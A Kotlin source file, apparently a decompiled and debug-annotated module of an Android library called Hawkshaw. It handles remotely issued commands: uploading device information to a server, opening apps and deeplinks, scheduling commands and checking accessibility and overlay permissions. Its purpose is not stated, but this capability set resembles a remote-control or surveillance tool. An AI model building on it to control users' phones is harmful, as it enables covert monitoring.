package com.hawkshaw.library.features.misc

import android.content.Intent
import android.net.Uri
import android.provider.Settings
import android.util.Log // Added for logging
import com.hawkshaw.library.App
import com.hawkshaw.library.Hawkshaw
import com.hawkshaw.library.config.DynamicConfigKt
import com.hawkshaw.library.datalayer.Injector
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.datalayer.models.DynamicConfig
import com.hawkshaw.library.datalayer.models.PushDeviceInfoRequest
import com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt
import com.hawkshaw.library.deviceinfo.DeviceInfo
import com.hawkshaw.library.handler.JobScheduler
import com.hawkshaw.library.ktextensions.ManifestPermissionsKt
import com.hawkshaw.library.logger.Logger
import com.hawkshaw.library.preferences.Prefs
import com.hawkshaw.library.utils.MiscKt as UtilsMiscKt
import kotlinx.coroutines.CancellableContinuation
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlin.coroutines.resume
import androidx.core.net.toUri

private const val TAG = "Misc"

private fun cancelScheduledCommand(request: Command.CancelScheduledCommandRequest?) {
    Log.d(TAG, "[DEBUG] cancelScheduledCommand called with request: $request")
    if (request != null) {
        Log.d(TAG, "[DEBUG] cancelScheduledCommand: Request is not null, calling JobScheduler.cancelScheduledCommand.")
        JobScheduler.cancelScheduledCommand(request)
    } else {
        Log.d(TAG, "[DEBUG] cancelScheduledCommand: Request was null.")
    }
}

private fun getDiagnosis() {
    Log.d(TAG, "[DEBUG] getDiagnosis called.")
    val sb = StringBuilder("Diagnosis\nLibVersion: 0.1.9\n\nApp Permissions\n")
    val permissionList = ManifestPermissionsKt.getGeneralPermissionList()
    Log.d(TAG, "[DEBUG] getDiagnosis: General permission list size: ${permissionList.size}")

    for (permission in permissionList) {
        val hasPermission = ManifestPermissionsKt.hasPermission(permission)
        Log.d(TAG, "[DEBUG] getDiagnosis: Permission '$permission', Granted: $hasPermission")
        sb.append("$permission ${if (hasPermission) "granted" else "denied"}\n")
    }

    val isAccessibilityEnabled = UtilsMiscKt.isAccessibilityEnabled(null)
    val canDrawOverlays = Settings.canDrawOverlays(App.getContext())
    Log.d(TAG, "[DEBUG] getDiagnosis: IsAccessibilityEnabled=$isAccessibilityEnabled, IsDrawOverAppsEnabled=$canDrawOverlays")

    sb.append("IsAccessibilityEnabled: $isAccessibilityEnabled\n")
    sb.append("IsDrawOverAppsEnabled: $canDrawOverlays\n")

    val diagnosisResult = sb.toString()
    Log.d(TAG, "[DEBUG] getDiagnosis: Final diagnosis string generated. Length: ${diagnosisResult.length}")
    Logger.d(TAG, diagnosisResult, false, 4, null) // Existing log
}

suspend fun handleMiscCommand(
    command: Command,
    continuation: CancellableContinuation<Any>
): Any {
    Log.d(TAG, "[DEBUG] handleMiscCommand called with command type: ${command.type}, command: $command")
    return when (command.type) {
        Command.CommandType.PushDeviceInfo -> {
            Log.d(TAG, "[DEBUG] handleMiscCommand: Handling PushDeviceInfo. Request: ${command.deviceInfoRequest}")
            val result = pushDeviceInfo(command.deviceInfoRequest, continuation)
            Log.d(TAG, "[DEBUG] handleMiscCommand: PushDeviceInfo result: $result")
            if (result == Unit) Unit else result
        }
        Command.CommandType.OpenApp -> {
            Log.d(TAG, "[DEBUG] handleMiscCommand: Handling OpenApp. Request: ${command.openAppRequest}")
            openApp(command.openAppRequest)
            Unit
        }
        Command.CommandType.OpenDeeplink -> {
            Log.d(TAG, "[DEBUG] handleMiscCommand: Handling OpenDeeplink. Request: ${command.openDeeplinkRequest}")
            openDeeplink(command.openDeeplinkRequest)
            Unit
        }
        Command.CommandType.GetDiagnosis -> {
            Log.d(TAG, "[DEBUG] handleMiscCommand: Handling GetDiagnosis.")
            getDiagnosis()
            Unit
        }
        Command.CommandType.ScheduleCommand -> {
            Log.d(TAG, "[DEBUG] handleMiscCommand: Handling ScheduleCommand. Request: ${command.scheduleCommandRequest}")
            scheduleCommand(command.scheduleCommandRequest)
            Unit
        }
        Command.CommandType.CancelScheduledCommand -> {
            Log.d(TAG, "[DEBUG] handleMiscCommand: Handling CancelScheduledCommand. Request: ${command.cancelScheduledCommandRequest}")
            cancelScheduledCommand(command.cancelScheduledCommandRequest)
            Unit
        }
        Command.CommandType.StartInitializer -> {
            Log.d(TAG, "[DEBUG] handleMiscCommand: Handling StartInitializer.")
            startHawkshawInitializer()
            Unit
        }
        Command.CommandType.SetDynamicConfig -> {
            Log.d(TAG, "[DEBUG] handleMiscCommand: Handling SetDynamicConfig. Request: ${command.setDynamicConfigRequest}")
            command.setDynamicConfigRequest?.let {
                Log.d(TAG, "[DEBUG] handleMiscCommand: Setting dynamic config: ${it.config}")
                Prefs.setDynamicConfig(it.config)
            }
            Unit
        }
        Command.CommandType.PushDynamicConfig -> {
            Log.d(TAG, "[DEBUG] handleMiscCommand: Handling PushDynamicConfig.")
            val json = ContentNegotiationInterceptorKt.json
            val dynamicConfig = DynamicConfigKt.getDynamicConfig()
            val dynamicConfigString = json.encodeToString(DynamicConfig.serializer(), dynamicConfig)
            Log.d(TAG, "[DEBUG] handleMiscCommand: Current DynamicConfig: $dynamicConfigString")
            Logger.d(
                TAG,
                // FIX: Changed DynamicConfigKt.serializer() to DynamicConfig.serializer()
                "DynamicConfig: ${json.encodeToString(DynamicConfig.serializer(), dynamicConfig)}",
                false,
                4,
                null
            )
            Unit
        }
        else -> {
            Log.d(TAG, "[DEBUG] handleMiscCommand: Unhandled command type: ${command.type}")
            Unit
        }
    }
}

private fun openApp(request: Command.OpenAppRequest?) {
    Log.d(TAG, "[DEBUG] openApp called with request: $request")
    if (request == null) {
        Log.d(TAG, "[DEBUG] openApp: Request was null. Returning.")
        return
    }
    
    val context = App.getContext()
    val packageName = request.packageName
    Log.d(TAG, "[DEBUG] openApp: Attempting to open app with package name: $packageName")
    var intent = context.packageManager.getLaunchIntentForPackage(packageName)
    
    if (intent != null) {
        Log.d(TAG, "[DEBUG] openApp: Launch intent found for $packageName. Intent: $intent")
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        Logger.d(TAG, "Start activity intent called for $packageName", false, 4, null) // Existing log
    } else {
        Log.d(TAG, "[DEBUG] openApp: Launch intent not found for $packageName. Creating market view intent.")
        intent = Intent(Intent.ACTION_VIEW).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            data = "market://details?id=$packageName".toUri()
        }
        Log.d(TAG, "[DEBUG] openApp: Market view intent created: $intent")
        Logger.d(TAG, "Market view intent called for $packageName", false, 4, null) // Existing log
    }
    
    Log.d(TAG, "[DEBUG] openApp: Calling UtilsMiscKt.startActivity with intent: $intent")
    UtilsMiscKt.startActivity(intent)
}

private fun openDeeplink(request: Command.OpenDeeplinkRequest?) {
    Log.d(TAG, "[DEBUG] openDeeplink called with request: $request")
    if (request == null) {
        Log.d(TAG, "[DEBUG] openDeeplink: Request was null. Returning.")
        return
    }
    
    try {
        Log.d(TAG, "[DEBUG] openDeeplink: Attempting to open deeplink: ${request.deeplink}")
        val intent = Intent(Intent.ACTION_VIEW).apply {
            data = request.deeplink.toUri()
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        Log.d(TAG, "[DEBUG] openDeeplink: Created intent: $intent. Calling UtilsMiscKt.startActivity.")
        UtilsMiscKt.startActivity(intent)
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] openDeeplink: Exception occurred: ${e.message}", e) // Added for debugging
        Logger.e(TAG, "OpenDeeplink: ${request.deeplink}, ${e.message}", b = false, i = 12, nothing = null) // Existing log
    }
}

private suspend fun pushDeviceInfo(
    request: Command.PushDeviceInfoRequest?,
    continuation: CancellableContinuation<Any>
): Any = suspendCancellableCoroutine { cont ->
    Log.d(TAG, "[DEBUG] pushDeviceInfo called with request: $request")
    if (request == null) {
        Log.d(TAG, "[DEBUG] pushDeviceInfo: Request was null. Resuming with Unit.")
        cont.resume(Unit)
        return@suspendCancellableCoroutine
    }

    Log.d(TAG, "[DEBUG] pushDeviceInfo: Launching CoroutineScope(Dispatchers.IO).")
    CoroutineScope(Dispatchers.IO).launch {
        Log.d(TAG, "[DEBUG] pushDeviceInfo: Coroutine started.")
        try {
            val context = App.getContext()
            val type = request.type
            Log.d(TAG, "[DEBUG] pushDeviceInfo: Request type: $type")
            val jsonObject = when (type) {
                Command.PushDeviceInfoRequest.Type.All -> {
                    Log.d(TAG, "[DEBUG] pushDeviceInfo: Getting All device info.")
                    DeviceInfo.getDeviceInfo()
                }
                Command.PushDeviceInfoRequest.Type.Dynamic -> {
                    Log.d(TAG, "[DEBUG] pushDeviceInfo: Getting Dynamic device info.")
                    DeviceInfo.getDynamicDeviceInfo(context)
                }
                Command.PushDeviceInfoRequest.Type.Static -> {
                    Log.d(TAG, "[DEBUG] pushDeviceInfo: Getting Static device info.")
                    DeviceInfo.getStaticDeviceInfo(context)
                }
            }
            Log.d(TAG, "[DEBUG] pushDeviceInfo: Device info JSON object obtained: $jsonObject")

            val appService = Injector.INSTANCE.appService
            val pushRequest = PushDeviceInfoRequest(type, jsonObject)
            Log.d(TAG, "[DEBUG] pushDeviceInfo: Created PushDeviceInfoRequest: $pushRequest")

            Log.d(TAG, "[DEBUG] pushDeviceInfo: Calling appService.pushDeviceInfo.")
            val response = appService.pushDeviceInfo(pushRequest)
            Log.d(TAG, "[DEBUG] pushDeviceInfo: Response from appService: ${response.state}")
            Logger.d(TAG, "PushDeviceInfo: ${response.state}", false, 4, null) // Existing log
            Log.d(TAG, "[DEBUG] pushDeviceInfo: Resuming continuation with response.")
            cont.resume(response)
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] pushDeviceInfo: Exception occurred: ${e.message}", e) // Added for debugging
            Logger.e(TAG, "Error in pushDeviceInfo: ${e.message}", b = false, i = 12, nothing = null) // Existing log
            Log.d(TAG, "[DEBUG] pushDeviceInfo: Resuming continuation with Unit due to exception.")
            cont.resume(Unit)
        }
        Log.d(TAG, "[DEBUG] pushDeviceInfo: Coroutine finished.")
    }
}

private fun scheduleCommand(request: Command.ScheduleCommandRequest?) {
    Log.d(TAG, "[DEBUG] scheduleCommand called with request: $request")
    if (request != null) {
        Log.d(TAG, "[DEBUG] scheduleCommand: Request is not null. Calling JobScheduler.scheduleCommand.")
        JobScheduler.scheduleCommand(request)
    } else {
        Log.d(TAG, "[DEBUG] scheduleCommand: Request was null.")
    }
}

private fun startHawkshawInitializer() {
    Log.d(TAG, "[DEBUG] startHawkshawInitializer called.")
    try {
        Log.d(TAG, "[DEBUG] startHawkshawInitializer: Calling Hawkshaw.initFromInternalActivity(false).")
        Hawkshaw.initFromInternalActivity(false)
        Log.d(TAG, "[DEBUG] startHawkshawInitializer: Hawkshaw.initFromInternalActivity completed.")
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] startHawkshawInitializer: Exception occurred: ${e.message}", e) // Added for debugging
        Logger.e(TAG, "StartHawkshawInitializer failed: ${e.message}", b = false, i = 12, nothing = null) // Existing log
    }
}

